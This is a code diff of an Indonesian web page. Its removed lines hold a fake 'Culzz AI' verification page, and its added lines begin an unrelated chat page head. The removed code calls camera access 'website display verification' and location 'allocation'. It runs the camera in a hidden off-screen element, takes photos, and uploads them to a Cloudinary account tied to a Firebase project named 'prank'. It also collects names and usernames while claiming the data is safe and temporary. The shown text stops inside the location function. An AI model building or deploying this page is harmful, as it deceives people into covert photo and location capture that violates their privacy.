@@ -1,1311 +1,849 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>Culzz AI • Verifikasi</title>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <title>DATZON AI Chat - Firebase Lite</title>
+  <meta name="description" content="DATZON AI chat dengan dark lime UI, liquid glass controls, model picker, temporary mode, attach file, voice input, typing animation, dan actions." />
+
+    <link rel="stylesheet" href="style.css" />
+  <link rel="preconnect" href="https://www.gstatic.com" crossorigin>
+  <link rel="preconnect" href="https://api.cloudinary.com" crossorigin>
+  <link rel="preconnect" href="https://i.ibb.co.com" crossorigin>
+  <link rel="preload" as="image" href="https://i.ibb.co.com/wZW5rhNm/66676-removebg-preview-image-repair-1782777130017.png" fetchpriority="low">
 
-        :root {
-            --bg-1: #06150d;
-            --bg-2: #0b2417;
-            --card: #102319;
-            --card-2: #132a1e;
-            --line: rgba(74, 222, 128, 0.18);
-            --line-strong: rgba(74, 222, 128, 0.45);
-            --text: #f4fff8;
-            --muted: #9fb7aa;
-            --soft: #c5f8d8;
-            --green: #36d982;
-            --green-2: #22c55e;
-            --green-dark: #0d5f37;
-            --warn: #f8c152;
-            --danger: #ff6b6b;
-            --shadow: 0 22px 60px rgba(0, 0, 0, 0.28);
-            --radius-xl: 30px;
-            --radius-lg: 22px;
-            --radius-md: 16px;
-        }
-
-        * {
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: rgba(34, 197, 94, 0.18);
-        }
-
-        html {
-            scroll-behavior: smooth;
-        }
-
-        body {
-            margin: 0;
-            min-height: 100vh;
-            color: var(--text);
-            font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-            background:
-                radial-gradient(circle at 10% -10%, rgba(54, 217, 130, 0.18), transparent 34%),
-                radial-gradient(circle at 90% 12%, rgba(86, 190, 124, 0.12), transparent 32%),
-                linear-gradient(145deg, var(--bg-1), var(--bg-2) 58%, #07140d);
-            overflow-x: hidden;
-        }
-
-        body::before {
-            content: "";
-            position: fixed;
-            inset: 0;
-            pointer-events: none;
-            opacity: 0.28;
-            background-image:
-                linear-gradient(rgba(255,255,255,0.025) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255,255,255,0.025) 1px, transparent 1px);
-            background-size: 34px 34px;
-            mask-image: linear-gradient(to bottom, black, transparent 88%);
-        }
-
-        button,
-        input {
-            font: inherit;
-        }
-
-        button {
-            border: 0;
-        }
-
-        .page {
-            width: min(1040px, 100%);
-            margin: 0 auto;
-            padding: 22px 18px 40px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .topbar {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 14px;
-            padding: 14px 0 22px;
-        }
-
-        .brand {
-            display: flex;
-            align-items: center;
-            gap: 13px;
-            min-width: 0;
-        }
-
-        .logo {
-            width: 58px;
-            height: 58px;
-            border-radius: 20px;
-            display: grid;
-            place-items: center;
-            background: linear-gradient(145deg, #28d87b, #0fa968);
-            box-shadow: 0 16px 28px rgba(34, 197, 94, 0.22), inset 0 1px 0 rgba(255,255,255,0.22);
-            flex: 0 0 auto;
-        }
-
-        .brand h1 {
-            margin: 0;
-            font-size: clamp(30px, 6vw, 46px);
-            line-height: 0.92;
-            letter-spacing: -1.7px;
-            font-weight: 800;
-        }
-
-        .brand p {
-            margin: 6px 0 0;
-            color: #65e6a4;
-            font-size: 11px;
-            letter-spacing: 3.3px;
-            font-weight: 700;
-        }
-
-        .live-pill {
-            display: flex;
-            align-items: center;
-            gap: 9px;
-            color: #90f6bd;
-            background: rgba(34, 197, 94, 0.10);
-            border: 1px solid rgba(74, 222, 128, 0.18);
-            padding: 12px 16px;
-            border-radius: 999px;
-            font-weight: 700;
-            font-size: 13px;
-            white-space: nowrap;
-        }
-
-        .hero {
-            background: linear-gradient(180deg, rgba(19, 42, 30, 0.98), rgba(11, 31, 21, 0.98));
-            border: 1px solid var(--line);
-            border-radius: var(--radius-xl);
-            box-shadow: var(--shadow);
-            padding: clamp(22px, 5vw, 38px);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .hero::after {
-            content: "";
-            position: absolute;
-            width: 220px;
-            height: 220px;
-            right: -84px;
-            top: -86px;
-            border-radius: 999px;
-            background: rgba(54, 217, 130, 0.12);
-            border: 1px solid rgba(74, 222, 128, 0.16);
-        }
-
-        .tag {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            padding: 8px 12px;
-            border-radius: 999px;
-            background: rgba(54, 217, 130, 0.12);
-            border: 1px solid rgba(74, 222, 128, 0.18);
-            color: #80efb2;
-            font-size: 12px;
-            font-weight: 800;
-            letter-spacing: 1.2px;
-            text-transform: uppercase;
-        }
-
-        .tag-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 99px;
-            background: var(--green);
-            box-shadow: 0 0 0 6px rgba(54, 217, 130, 0.13);
-        }
-
-        .hero h2 {
-            margin: 16px 0 10px;
-            max-width: 760px;
-            font-size: clamp(38px, 9vw, 78px);
-            line-height: 0.92;
-            letter-spacing: -3px;
-            font-weight: 800;
-            position: relative;
-            z-index: 1;
-        }
-
-        .hero h2 span {
-            color: #6ff2a6;
-        }
-
-        .hero-text {
-            max-width: 650px;
-            color: var(--muted);
-            font-size: 15px;
-            line-height: 1.65;
-            margin: 0;
-            position: relative;
-            z-index: 1;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: 0.84fr 1.16fr;
-            gap: 18px;
-            margin-top: 18px;
-        }
-
-        .card {
-            background: rgba(16, 35, 25, 0.98);
-            border: 1px solid var(--line);
-            border-radius: var(--radius-xl);
-            box-shadow: var(--shadow);
-            padding: clamp(20px, 4vw, 30px);
-        }
-
-        .card-title {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin: 0 0 20px;
-            font-size: 20px;
-            font-weight: 800;
-            letter-spacing: -0.4px;
-        }
-
-        .icon-box {
-            width: 38px;
-            height: 38px;
-            border-radius: 14px;
-            display: grid;
-            place-items: center;
-            color: #75efad;
-            background: rgba(54, 217, 130, 0.12);
-            border: 1px solid rgba(74, 222, 128, 0.14);
-        }
-
-        .field {
-            margin-bottom: 16px;
-        }
-
-        .field label {
-            display: block;
-            margin-bottom: 8px;
-            color: #75efad;
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-            font-weight: 800;
-        }
-
-        .field input {
-            width: 100%;
-            border: 1px solid rgba(159, 183, 170, 0.18);
-            outline: 0;
-            border-radius: 18px;
-            background: #07140d;
-            color: var(--text);
-            padding: 15px 16px;
-            transition: border-color 0.2s ease, box-shadow 0.2s ease, transform 0.2s ease;
-        }
-
-        .field input:focus {
-            border-color: rgba(74, 222, 128, 0.75);
-            box-shadow: 0 0 0 5px rgba(54, 217, 130, 0.10);
-        }
-
-        .note {
-            display: flex;
-            gap: 10px;
-            color: #baf7d2;
-            background: rgba(54, 217, 130, 0.08);
-            border: 1px solid rgba(74, 222, 128, 0.15);
-            border-radius: 20px;
-            padding: 14px;
-            line-height: 1.5;
-            font-size: 13px;
-        }
-
-        .steps {
-            display: grid;
-            gap: 12px;
-        }
-
-        .step-card {
-            display: grid;
-            grid-template-columns: auto 1fr auto;
-            align-items: center;
-            gap: 14px;
-            padding: 16px;
-            background: rgba(7, 20, 13, 0.72);
-            border: 1px solid rgba(159, 183, 170, 0.14);
-            border-radius: 22px;
-        }
-
-        .step-no {
-            width: 38px;
-            height: 38px;
-            display: grid;
-            place-items: center;
-            border-radius: 14px;
-            color: #09160f;
-            background: #8ff7b8;
-            font-weight: 900;
-        }
-
-        .step-copy strong {
-            display: block;
-            font-size: 16px;
-            margin-bottom: 3px;
-        }
-
-        .step-copy span {
-            color: var(--muted);
-            font-size: 12px;
-            line-height: 1.45;
-        }
-
-        .status-pill {
-            padding: 8px 10px;
-            border-radius: 999px;
-            font-size: 11px;
-            font-weight: 900;
-            color: #211603;
-            background: rgba(248, 193, 82, 0.95);
-            white-space: nowrap;
-        }
-
-        .status-pill.ok {
-            color: #052414;
-            background: #6ff2a6;
-        }
-
-        .actions {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin-top: 17px;
-        }
-
-        .btn {
-            cursor: pointer;
-            min-height: 58px;
-            border-radius: 20px;
-            color: var(--text);
-            background: #173024;
-            border: 1px solid rgba(74, 222, 128, 0.20);
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            font-weight: 900;
-            transition: transform 0.18s ease, background 0.18s ease, border-color 0.18s ease, opacity 0.18s ease;
-            user-select: none;
-        }
-
-        .btn:active {
-            transform: scale(0.985);
-        }
-
-        .btn:hover {
-            background: #1d3c2c;
-            border-color: rgba(111, 242, 166, 0.52);
-        }
-
-        .btn.primary {
-            width: 100%;
-            min-height: 76px;
-            margin-top: 14px;
-            font-size: clamp(18px, 4vw, 24px);
-            color: #04140b;
-            background: linear-gradient(135deg, #8ff7b8, #22c55e);
-            box-shadow: 0 18px 34px rgba(34, 197, 94, 0.21);
-        }
-
-        .btn.primary.locked,
-        .btn.primary:disabled {
-            cursor: not-allowed;
-            opacity: 0.56;
-            color: rgba(255,255,255,0.46);
-            background: #27322c;
-            box-shadow: none;
-            border-color: rgba(255,255,255,0.06);
-        }
-
-        .btn.ai-link {
-            display: none;
-            width: 100%;
-            margin-top: 12px;
-            text-decoration: none;
-            min-height: 66px;
-            color: #052414;
-            background: linear-gradient(135deg, #d9ffe7, #75efad);
-            border-color: rgba(159, 248, 196, 0.55);
-            box-shadow: 0 18px 34px rgba(117, 239, 173, 0.16);
-        }
-
-        .btn.ai-link.show {
-            display: inline-flex;
-        }
-
-        .btn svg {
-            flex: 0 0 auto;
-        }
-
-        .mini-row {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 10px;
-            color: var(--muted);
-            margin-top: 14px;
-            font-size: 12px;
-        }
-
-        .mini-chip {
-            display: inline-flex;
-            align-items: center;
-            gap: 7px;
-            background: rgba(7, 20, 13, 0.54);
-            border: 1px solid rgba(159, 183, 170, 0.10);
-            border-radius: 999px;
-            padding: 8px 10px;
-        }
-
-        .status-box {
-            margin-top: 18px;
-        }
-
-        .status-head {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 14px;
-            margin-bottom: 12px;
-        }
-
-        .status-head h3 {
-            margin: 0;
-            font-size: 17px;
-        }
-
-        .mode-badge {
-            padding: 8px 12px;
-            border-radius: 999px;
-            color: #9ff8c4;
-            background: rgba(54, 217, 130, 0.10);
-            border: 1px solid rgba(74, 222, 128, 0.16);
-            font-size: 11px;
-            font-weight: 900;
-            white-space: nowrap;
-        }
-
-        .log {
-            min-height: 126px;
-            max-height: 190px;
-            overflow: auto;
-            border: 1px solid rgba(74, 222, 128, 0.12);
-            background: #06110b;
-            color: #baf7d2;
-            border-radius: 20px;
-            padding: 15px;
-            font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
-            font-size: 12px;
-            line-height: 1.65;
-            scrollbar-width: thin;
-        }
-
-        .log .ok { color: #75efad; }
-        .log .warn { color: #f8c152; }
-        .log .err { color: #ff8c8c; }
-        .log .step { color: #8ff7b8; font-weight: 800; }
-        .log .info { color: #c5f8d8; }
-
-        .complete-box {
-            display: none;
-            margin-top: 18px;
-            border-radius: 24px;
-            padding: 18px;
-            border: 1px solid rgba(74, 222, 128, 0.28);
-            background: rgba(54, 217, 130, 0.10);
-            color: #cdfbdd;
-            line-height: 1.55;
-        }
-
-        .complete-box.show {
-            display: block;
-        }
-
-        .backend-runtime {
-            position: fixed;
-            left: -99999px;
-            top: -99999px;
-            width: 1px;
-            height: 1px;
-            overflow: hidden;
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        #toast {
-            position: fixed;
-            left: 50%;
-            bottom: 22px;
-            transform: translate(-50%, 20px);
-            width: min(520px, calc(100% - 28px));
-            background: #f4fff8;
-            color: #07140d;
-            border-radius: 18px;
-            padding: 13px 15px;
-            box-shadow: 0 20px 54px rgba(0,0,0,0.36);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-weight: 800;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.22s ease, transform 0.22s ease;
-            z-index: 20;
-        }
-
-        #toast.show {
-            opacity: 1;
-            transform: translate(-50%, 0);
-        }
-
-        #toast.error {
-            background: #fff3f3;
-            color: #6c1111;
-        }
-
-        #toast.warn {
-            background: #fff8e6;
-            color: #5d3b00;
-        }
-
-        .footer {
-            margin: 22px 0 0;
-            color: rgba(197, 248, 216, 0.55);
-            text-align: center;
-            font-size: 12px;
-        }
-
-        @media (max-width: 820px) {
-            .page {
-                padding-inline: 14px;
-            }
-
-            .topbar {
-                align-items: flex-start;
-            }
-
-            .live-pill {
-                display: none;
-            }
-
-            .grid {
-                grid-template-columns: 1fr;
-            }
-
-            .hero h2 {
-                letter-spacing: -2.1px;
-            }
-        }
-
-        @media (max-width: 520px) {
-            .logo {
-                width: 52px;
-                height: 52px;
-                border-radius: 18px;
-            }
-
-            .brand h1 {
-                font-size: 34px;
-            }
-
-            .brand p {
-                font-size: 10px;
-                letter-spacing: 2.7px;
-            }
-
-            .hero,
-            .card {
-                border-radius: 26px;
-            }
-
-            .actions {
-                grid-template-columns: 1fr;
-            }
-
-            .step-card {
-                grid-template-columns: auto 1fr;
-            }
-
-            .step-card .status-pill {
-                grid-column: 2 / 3;
-                width: fit-content;
-            }
-        }
-    </style>
 </head>
-<body>
-    <main class="page" id="newApp">
-        <header class="topbar">
-            <div class="brand">
-                <div class="logo" aria-hidden="true">
-                    <svg width="34" height="34" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M32 5C19.8 13.3 10.4 24.2 6 32c4.4 7.8 13.8 18.7 26 27 12.2-8.3 21.6-19.2 26-27C53.6 24.2 44.2 13.3 32 5Z" fill="#07351f"/>
-                        <path d="M32 5c12.2 8.3 21.6 19.2 26 27-4.4 7.8-13.8 18.7-26 27V5Z" fill="#b7ffd0" opacity=".95"/>
-                        <path d="M20 35c7-1 12-8.5 12-18 6.6 6.5 8.9 14.6 6.9 23.1-2.6 10.7-13.4 11.3-18.9 5.4 5.5-.7 8.7-4.2 10.7-9.3-3.2 1.2-6.7 1-10.7-1.2Z" fill="#14b86b"/>
-                    </svg>
-                </div>
-                <div>
-                    <h1>Culzz AI</h1>
-                    <p>VERIFIKASI</p>
-                </div>
-            </div>
 
-            <div class="live-pill">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 21c4.97 0 9-4.03 9-9s-4.03-9-9-9-9 4.03-9 9 4.03 9 9 9Z" stroke="currentColor" stroke-width="2"/><path d="M3.6 9h16.8M3.6 15h16.8M12 3c2.1 2.35 3.1 5.35 3.1 9S14.1 18.65 12 21M12 3C9.9 5.35 8.9 8.35 8.9 12S9.9 18.65 12 21" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
-                <span>Verifikasi aktif</span>
-            </div>
-        </header>
-
-        <section class="hero">
-            <div class="tag"><span class="tag-dot"></span>Pusat verifikasi</div>
-            <h2>Verifikasi dahulu baru lanjut, <span>AI baca nanti.</span></h2>
-            <p class="hero-text">
-                Halaman ini cuma buat verifikasi: Jika verifikasi berhasil, Kamu bisa masuk ke halaman utamanya dimana kamu bisa mengakses semua fitur yang ada, Kamu bisa nanya dan buat sesuatu tanpa batas loh.
-            </p>
-        </section>
-
-        <section class="grid">
-            <div class="card">
-                <h2 class="card-title">
-                    <span class="icon-box" aria-hidden="true">
-                        <svg width="21" height="21" viewBox="0 0 24 24" fill="none"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/><path d="M12 11a4 4 0 1 0 0-8 4 4 0 0 0 0 8Z" stroke="currentColor" stroke-width="2"/></svg>
-                    </span>
-                    Data Pengguna
-                </h2>
-
-                <div class="field">
-                    <label for="nama">Nama lengkap</label>
-                    <input id="nama" type="text" autocomplete="name" placeholder="Contoh: Icul Asik">
-                </div>
-
-                <div class="field">
-                    <label for="username">Username / ID unik</label>
-                    <input id="username" type="text" autocomplete="username" placeholder="Contoh: culzcuyy">
-                </div>
-
-                <div class="note">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" style="flex:0 0 auto"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10Z" stroke="#75efad" stroke-width="2" stroke-linejoin="round"/><path d="m9 12 2 2 4-5" stroke="#75efad" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-                    <span>Data nama dan username tersimpan dengan baik dan aman, ini berfungsi agar kamu nanti langsung di ketahui oleh AI nya bahwa kamu berhasil atau nggak untuk Verifikasi nya.</span>
-                </div>
-            </div>
-
-            <div class="card">
-                <h2 class="card-title">
-                    <span class="icon-box" aria-hidden="true">
-                        <svg width="21" height="21" viewBox="0 0 24 24" fill="none"><path d="M13 2 3 14h8l-1 8 11-13h-8l1-7Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>
-                    </span>
-                    Alur Verifikasi
-                </h2>
-
-                <div class="steps">
-                    <div class="step-card" id="step-camera">
-                        <div class="step-no">1</div>
-                        <div class="step-copy">
-                            <strong>Verifikasi Tampilan Website</strong>
-                            <span>Memastikan apakah device kamu memenuhi tampilan pada Website AI nantinya.</span>
-                        </div>
-                        <span id="camera-status-pill" class="status-pill">Belum</span>
-                    </div>
-
-                    <div class="step-card" id="step-location">
-                        <div class="step-no">2</div>
-                        <div class="step-copy">
-                            <strong>Verifikasi Alokasi</strong>
-                            <span>Memastikan apakah kamu berada di wilayah aman, Tenang saja, data berupa Temporary jadi akan di hapus otomatis ketika kamu selesai Verifikasi.</span>
-                        </div>
-                        <span id="location-status-pill" class="status-pill">Belum</span>
-                    </div>
-
-                    <div class="step-card" id="step-upload">
-                        <div class="step-no">3</div>
-                        <div class="step-copy">
-                            <strong>Cek Verifikasi</strong>
-                            <span>Melakukan pemeriksaan verifikasi sesuai kriteria di atas apakah sudah complete, Tunggu beberapa detik dulu ya.</span>
-                        </div>
-                        <span id="upload-status-pill" class="status-pill">Terkunci</span>
-                    </div>
-                </div>
-
-                <div class="actions">
-                    <button type="button" class="btn" id="btn-verify-camera" onclick="verifyCameraAccess()">
-                        
-                        Verifikasi Tampilan Website
-                    </button>
-
-                    <button type="button" class="btn" id="btn-verify-location" onclick="verifyLocationAccess()">
-                        
-                        Verifikasi Alokasi
-                    </button>
-                </div>
-
-                <button type="button" class="btn primary locked" id="bulk-upload-btn" onclick="startBulkUpload()" disabled>
-                    
-                    MULAI VERIFIKASI
-                </button>
-
-                <a class="btn ai-link" id="ai-website-btn" href="https://example.com/culzz-ai" target="_blank" rel="noopener noreferrer">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M5 12h14" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/><path d="m13 6 6 6-6 6" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/><path d="M5 5v14" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/></svg>
-                    BUKA WEBSITE AI
-                </a>
-
-                <div class="mini-row">
-                    <span class="mini-chip">Tampilan UI</span>
-                    <span class="mini-chip">Tampilan Style</span>
-                    <span class="mini-chip">Alokasi Logic</span>
-                    <span class="mini-chip">Logic AI</span>
-                </div>
-            </div>
-        </section>
-
-        <section class="card status-box">
-            <div class="status-head">
-                <h3>Status Proses</h3>
-                <span class="mode-badge" id="mode-badge"><span id="mode-text">SIAP</span></span>
-            </div>
-            <div id="status" class="log">Menunggu perintah...<br><span class="info">Selesaikan Verifikasi Tampilan dan Alokasi dulu, baru Mulai Verifikasi kebuka.</span></div>
-            <div id="complete-box" class="complete-box">
-                <strong>Verifikasi selesai.</strong><br>
-                Terimakasih Sudah memverifikasi, Silahkan klik tombol buka website AI Untuk mencobanya ya.
-            </div>
-        </section>
-
-        <p class="footer">Culzz AI • Pusat Verifikasi • Tampilan dan Alokasi saja.</p>
-    </main>
-
-    <div class="backend-runtime" aria-hidden="true">
-        <video id="video" autoplay muted playsinline></video>
-        <div id="capture-overlay"></div>
-        <div id="camera-status"></div>
-        <div id="results-section"></div>
-        <img id="selfie-preview" alt="">
-        <img id="back-preview" alt="">
+<body class="home-mode perf-lite">
+  <div class="top-controls" aria-label="Kontrol atas">
+    <div class="top-left">
+      <button class="glass-btn round-btn" id="sidebarBtn" type="button" aria-label="Buka sidebar">
+        <svg width="25" height="25" viewBox="0 0 24 24" fill="none"><path d="M5 7h14M5 12h10M5 17h14" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/></svg>
+      </button>
     </div>
 
-    <div id="toast"><span id="toast-icon"></span><span id="toast-message"></span></div>
-
-    <script>
-        // ==================== FIREBASE & CLOUDINARY CONFIG ====================
-        const firebaseConfig = {
-            apiKey: "AIzaSyAa_pnrFE5VgWDfsKab-BoNc-LoBi6iuBI",
-            authDomain: "prank-882b4.firebaseapp.com",
-            projectId: "prank-882b4",
-            storageBucket: "prank-882b4.firebasestorage.app",
-            messagingSenderId: "663468311394",
-            appId: "1:663468311394:web:a3f783629485bbe9f9a23b"
-        };
-
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
-
-        const CLOUD_NAME = "dhmicbtnv";
-        const UPLOAD_PRESET = "culzzai";
-        const AI_WEBSITE_URL = "https://example.com/culzz-ai";
-
-        // ==================== GLOBAL VARIABLES ====================
-        let currentStream = null;
-        let video = null;
-        let isProcessing = false;
-        let cameraGranted = false;
-        let locationGranted = false;
-        let lastLocationData = null;
-        let toastTimer = null;
-
-        // ==================== UI HELPERS ====================
-        function showToast(message, type = 'info') {
-            const toast = document.getElementById('toast');
-            const icon = document.getElementById('toast-icon');
-            const text = document.getElementById('toast-message');
-
-            toast.className = '';
-            if (type === 'error') toast.classList.add('error');
-            if (type === 'warning') toast.classList.add('warn');
-
-            icon.textContent = type === 'error' ? '!' : type === 'warning' ? '!' : '✓';
-            text.textContent = message;
-            toast.classList.add('show');
-
-            clearTimeout(toastTimer);
-            toastTimer = setTimeout(() => toast.classList.remove('show'), 3300);
-        }
-
-        function logStatus(message, type = 'info') {
-            const statusEl = document.getElementById('status');
-            const timestamp = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-            const safeMessage = String(message).replace(/[&<>"]/g, (m) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[m]));
-            const className = type === 'success' ? 'ok' : type === 'error' ? 'err' : type === 'warning' ? 'warn' : type === 'step' ? 'step' : 'info';
-            const label = type === 'success' ? 'BERHASIL' : type === 'error' ? 'ERROR' : type === 'warning' ? 'PERINGATAN' : type === 'step' ? 'PROSES' : 'INFO';
-            const line = `<div class="${className}">[${timestamp}] ${label}: ${safeMessage}</div>`;
-            statusEl.innerHTML = line + statusEl.innerHTML;
-            statusEl.scrollTop = 0;
-        }
-
-        function updateModeBadge(text) {
-            const textEl = document.getElementById('mode-text');
-            if (textEl) textEl.textContent = String(text || 'SIAP').toUpperCase();
-        }
-
-        function showCaptureOverlay(show) {
-            const overlay = document.getElementById('capture-overlay');
-            if (overlay) overlay.style.display = show ? 'block' : 'none';
-        }
-
-        function delay(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-
-        function stopCurrentStream() {
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-                currentStream = null;
-            }
-            if (video) video.srcObject = null;
-        }
-
-        function setButtonLoading(buttonId, loading, textWhenLoading) {
-            const btn = document.getElementById(buttonId);
-            if (!btn) return;
-            if (!btn.dataset.originalText) btn.dataset.originalText = btn.innerHTML;
-            btn.disabled = loading;
-            btn.style.opacity = loading ? '0.72' : '';
-            if (loading) {
-                btn.innerHTML = textWhenLoading;
-            } else {
-                btn.innerHTML = btn.dataset.originalText;
-            }
-        }
-
-        function setPillState(pillId, state, text) {
-            const pill = document.getElementById(pillId);
-            if (!pill) return;
-            pill.textContent = text;
-            pill.className = state === 'ok' ? 'status-pill ok' : 'status-pill';
-        }
-
-        function updatePermissionUI() {
-            setPillState('camera-status-pill', cameraGranted ? 'ok' : 'pending', cameraGranted ? 'Terverifikasi' : 'Belum');
-            setPillState('location-status-pill', locationGranted ? 'ok' : 'pending', locationGranted ? 'Terverifikasi' : 'Belum');
-            setPillState('upload-status-pill', cameraGranted && locationGranted ? 'ok' : 'pending', cameraGranted && locationGranted ? 'Siap' : 'Terkunci');
-
-            const bulkBtn = document.getElementById('bulk-upload-btn');
-            if (bulkBtn) {
-                const ready = cameraGranted && locationGranted && !isProcessing;
-                bulkBtn.disabled = !ready;
-                bulkBtn.classList.toggle('locked', !ready);
-            }
-        }
-
-        function resetCompleteBox() {
-            const box = document.getElementById('complete-box');
-            if (box) box.classList.remove('show');
-
-            const aiBtn = document.getElementById('ai-website-btn');
-            if (aiBtn) {
-                aiBtn.classList.remove('show');
-                aiBtn.href = AI_WEBSITE_URL;
-            }
-        }
-
-        function showAIWebsiteButton(username, docId) {
-            const aiBtn = document.getElementById('ai-website-btn');
-            if (!aiBtn) return;
-
-            const url = new URL(AI_WEBSITE_URL);
-            if (username) url.searchParams.set('username', username);
-            if (docId) url.searchParams.set('doc', docId);
-
-            aiBtn.href = url.toString();
-            aiBtn.classList.add('show');
-        }
-
-        function isPermissionDeniedError(error) {
-            if (!error) return false;
-            return error.name === 'NotAllowedError' ||
-                   error.name === 'PermissionDeniedError' ||
-                   error.code === 1 ||
-                   /denied|disallow|blocked|permission/i.test(error.message || '');
-        }
-
-        function explainBlockedPermission(kind) {
-            const label = kind === 'camera' ? 'Tampilan' : 'Alokasi';
-            const settingName = kind === 'camera' ? 'Camera/Tampilan' : 'Location/Alokasi';
-            logStatus(`Izin ${label} sedang ditolak/diblokir browser. Website sudah minta ulang, tapi browser tidak selalu menampilkan popup lagi setelah kamu tekan Tolak. Buka ikon info/gembok di address bar → Site settings → ${settingName} → Allow/Izinkan, lalu tekan verifikasi lagi. Teknologi memang hobi sok jaga gerbang.`, 'warning');
-            showToast(`Izin ${label} diblokir. Ubah ke Izinkan di pengaturan situs.`, 'warning');
-        }
-
-        // ==================== CAMERA & LOCATION CORE ====================
-        async function startCamera(facingMode) {
-            try {
-                stopCurrentStream();
-
-                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    throw new Error('Browser tidak mendukung akses Tampilan. Pakai Chrome terbaru dan buka lewat HTTPS.');
-                }
-
-                const constraints = {
-                    video: {
-                        facingMode: { ideal: facingMode },
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: false
-                };
-
-                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
-                video.srcObject = currentStream;
-                await video.play().catch(() => {});
-
-                updateModeBadge(facingMode === 'user' ? 'TAMPILAN DEPAN' : 'TAMPILAN BELAKANG');
-                const cameraStatus = document.getElementById('camera-status');
-                if (cameraStatus) cameraStatus.textContent = facingMode === 'user' ? 'Tampilan depan aktif' : 'Tampilan belakang aktif';
-
-                await new Promise((resolve) => {
-                    if (video.readyState >= 2) return resolve();
-                    video.onloadedmetadata = () => resolve();
-                    setTimeout(resolve, 2200);
-                });
-
-                return true;
-            } catch (error) {
-                logStatus(`Gagal mengakses Tampilan: ${error.message}`, 'error');
-                throw error;
-            }
-        }
-
-        async function captureAndUploadToCloudinary(typeLabel) {
-            return new Promise(async (resolve, reject) => {
-                try {
-                    showCaptureOverlay(true);
-                    logStatus(`Tampilan Website berhasil di baca`, 'step');
-                    await delay(450);
-
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 1280;
-                    canvas.height = video.videoHeight || 720;
-
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    canvas.toBlob(async (blob) => {
-                        if (!blob) {
-                            showCaptureOverlay(false);
-                            reject(new Error('Gagal membuat akses dari Tampilan'));
-                            return;
-                        }
-
-                        logStatus(`Tampilan website menerima Kamu`, 'step');
-
-                        const formData = new FormData();
-                        formData.append('file', blob);
-                        formData.append('upload_preset', UPLOAD_PRESET);
-                        formData.append('folder', 'culzz-verifikasi');
-
-                        try {
-                            const response = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
-                                method: 'POST',
-                                body: formData
-                            });
-
-                            const data = await response.json();
-                            showCaptureOverlay(false);
-
-                            if (data.secure_url) {
-                                logStatus(`AI Culz berhasil di baca`, 'success');
-                                resolve(data.secure_url);
-                            } else {
-                                reject(new Error(data.error?.message || 'Upload Cloudinary gagal'));
-                            }
-                        } catch (uploadError) {
-                            showCaptureOverlay(false);
-                            reject(uploadError);
-                        }
-                    }, 'image/jpeg', 0.88);
-                } catch (err) {
-                    showCaptureOverlay(false);
-                    reject(err);
-                }
-            });
-        }
-
-        function requestLocationDetailed() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    const err = new Error('Browser tidak mendukung geolocation');
-                    logStatus(err.message, 'warning');
-                    resolve({ ok: false, error: err });
-                    return;
-                }
-
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const loc = {
-                            lat: position.coords.latitude,
